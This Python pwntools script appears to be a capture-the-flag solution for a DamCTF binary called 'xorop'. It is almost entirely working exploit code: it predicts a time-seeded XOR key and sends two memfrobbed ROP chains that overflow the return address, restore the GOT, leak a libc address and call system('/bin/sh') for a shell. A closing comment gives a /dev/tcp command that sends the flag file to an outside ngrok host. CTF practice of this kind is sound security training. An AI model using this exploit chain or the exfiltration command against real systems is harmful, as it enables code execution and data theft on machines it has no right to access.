#!/usr/bin/env python3

"""
Run exploit locally with:
./solve.py

Run against remote with:
./solve.py REMOTE HOST=chals.damctf.xyz PORT=31228
"""

import time
from ctypes import CDLL

from pwn import *

PROG_PATH = "./xorop"


def init_pwntools_context():
    context.binary = PROG_PATH
    context.terminal = ["tmux", "splitw", "-h"]
    context.log_level = "debug"


def init_challenge_context():
    if args["REMOTE"]:
        io = remote(args["HOST"], int(args["PORT"]))
        libc = ELF("./libc.so.6", checksec=False)
    else:
        pty = process.PTY
        io = process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

    return io, libc


class Offsets:
    rip_overwrite = 72


class Gadgets:
    # ret;
    ret = 0x00400659

    # pop rdi; ret;
    pop_rdi = 0x0040088f

    # pop rsi; pop r15; ret;
    pop_rsi_pop_r15 = 0x0040088d

    # 00400708  483137             xor     qword [rdi], rsi
    # 0040070b  4883c708           add     rdi, 0x8
    # 0040070f  4839fa             cmp     rdx, rdi
    # 00400712  77f4               ja      0x400708
    #
    # 00400714  f3c3               retn     {__return_addr}
    xor_loop = 0x00400708

    got_stomping_loop = 0x004007d4

    read_input_first_puts_call = 0x0040072c


class Constants:
    input_len = 0x100


def memfrob(buf):
    return bytes([i ^ 42 for i in buf])


def compute_key(libc, seed_char):
    cdll = CDLL(libc.path)

    seed_byte = ord(seed_char)
    now = int(time.time())
    cdll.srand((seed_byte << 0x10) ^ now)

    key = cdll.rand()
    key ^= (cdll.rand() << 0x15) & 0xffffffffffffffff
    key ^= (cdll.rand() << 0x2a) & 0xffffffffffffffff

    return key


def win(io, libc):
    elf = context.binary

    seed_char = "x"
    io.sendafter("continue.\n", seed_char)

    key = compute_key(libc, seed_char)
    log.info("Computed key %#x" % key)

    if args["GDB"]:
        gdb.attach(io, """
            # Sanity check to make sure we computed the right key.
            x/gx 0x00600c38

            # Break at end of read_input to step through rop payload.
            break *0x0040081a
        """)

    undo_key = 0xffffffffffffffff - key + 1
    log.info("Attempting to overwrite key to %#x" % undo_key)

    rop = b""
    rop += b"A" * Offsets.rip_overwrite

    # Change the key to one that will undo all of the GOT changes.
    rop += p64(Gadgets.pop_rdi)
    rop += p64(elf.sym.key)
    rop += p64(Gadgets.pop_rsi_pop_r15)
    rop += p64(key ^ undo_key)
    rop += b"D" * 8
    rop += p64(Gadgets.xor_loop)

    # Re-run the GOT stomping loop to restore all of the entries.
    rop += p64(Gadgets.got_stomping_loop)

    # Account for add rsp, 0x40; pop rbx at the end of read_input.
    rop += b"C" * 0x48

    # Restore stdout to fd 1 and leak a libc address.
    rop += p64(Gadgets.pop_rdi)
    rop += p64(3)
    rop += p64(elf.plt.dup)
    rop += p64(Gadgets.pop_rdi)
    rop += p64(elf.got.puts)

    # This gadget serves two purposes for us. First, it avoids calling directly
    # into puts@plt. We must avoid including puts@plt directly in our code
    # since it includes the byte 0x20. When memfrobbed, this byte is 0x0a (i.e.,
    # a newline), which is a bad character for the fgets call that reads our
    # input.
    #
    # Second, it also redirects execution back into the beginning of read_input,
    # so we can send our second stage rop.
    rop += p64(Gadgets.read_input_first_puts_call)

    assert len(rop) <= Constants.input_len
    rop += b"X" * (Constants.input_len - len(rop))

    memfrobbed_rop = memfrob(rop)
    assert not any(x == 0x0a for x in memfrobbed_rop)

    io.sendafter("memfrob?\n", memfrobbed_rop[:-1])

    io.recvuntil("no leaks 4 u.\n")
    raw_leak = io.recvline().rstrip(b"\n")
    leaked_puts = u64(raw_leak.ljust(8, b"\x00"))
    log.info("Leaked puts@libc address %#x" % leaked_puts)

    libc.address = leaked_puts - libc.sym.puts
    log.info("Computed libc based address %#x" % libc.address)

    # We now start our second chain.
    rop = b""
    rop += b"A" * Offsets.rip_overwrite

    # Change the key to /bin/sh.
    rop += p64(Gadgets.pop_rdi)
    rop += p64(elf.sym.key)
    rop += p64(Gadgets.pop_rsi_pop_r15)
    rop += p64(undo_key ^ u64(b"/bin/sh\x00"))
    rop += b"D" * 8
    rop += p64(Gadgets.xor_loop)

    # Call system("/bin/sh"). Padding with extra ret to avoid movaps segfault.
    rop += p64(Gadgets.ret)
    rop += p64(Gadgets.pop_rdi)
    rop += p64(elf.sym.key)
    rop += p64(libc.sym.system)

    assert len(rop) <= Constants.input_len

    memfrobbed_rop = memfrob(rop)
    assert not any(x == 0x0a for x in memfrobbed_rop)

    # Program should now be blocking on our read, so we send the second rop.
    io.sendline(memfrobbed_rop)

    # stdout is no longer open on fd 1, so we can't get direct output.
    # Instead, we can exfil our flag over the network like:
    # /bin/bash -c "cat fl* > /dev/tcp/0.tcp.ngrok.io/11298"
    io.interactive()


if __name__ == "__main__":
    init_pwntools_context()
    io, libc = init_challenge_context()

    win(io, libc)
